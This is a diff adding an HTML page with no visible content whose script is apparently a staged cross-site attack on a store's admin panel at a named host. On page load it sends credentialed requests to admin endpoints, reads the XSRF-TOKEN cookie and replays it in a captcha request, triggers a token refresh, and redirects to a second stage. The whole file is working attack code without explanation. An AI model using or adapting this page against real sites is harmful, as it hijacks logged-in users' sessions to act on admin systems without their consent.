@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+</head>
+<body>
+
+</body>
+<script>
+        let cookie = "";
+        let refreshxhr = new XMLHttpRequest();
+        let refreshurl = "https://kyky.6u6u.ru:8081/store/public/admin/default/refreshToken";
+        refreshxhr.open("GET", refreshurl, true);
+        refreshxhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+        refreshxhr.withCredentials = true;
+        refreshxhr.onreadystatechange = function () {
+                if (refreshxhr.readyState === 4) {
+                        window.location.href = "?stage=2"
+                }
+        }
+        let captchaxhr = new XMLHttpRequest();
+        let captchaurl = "https://kyky.6u6u.ru:8081/captcha";
+        captchaxhr.open("POST", captchaurl, true);
+        captchaxhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+        captchaxhr.withCredentials = true;
+        captchaxhr.onreadystatechange = function () {
+                if (captchaxhr.readyState === 4) {
+                        var i = 10000000;
+                        while(i !== 0) i--;
+                        refreshxhr.send();
+                }
+        }
+        let langxhr = new XMLHttpRequest();
+        let langurl = "https://kyky.6u6u.ru:8081/store/public/admin/default/language?lang=";
+        langxhr.open("GET", langurl, true);
+        langxhr.withCredentials = true;
+        langxhr.onreadystatechange = function () {
+                if (langxhr.readyState === 4) {
+                        let allcookie = document.cookie.split('; ');
+                        allcookie.forEach((s) => {
+                        if(s.startsWith("XSRF-TOKEN=")){
+                                cookie = s.split('=')[1].replaceAll("%3D", "=");
+                        }
+                        });
+                        captchaxhr.setRequestHeader("X-Xsrf-Token", cookie);
+                        captchaxhr.send(JSON.stringify({'id': 'login_captcha'}));
+                }
+        }
+        langxhr.send();
+
+</script>
+</html>
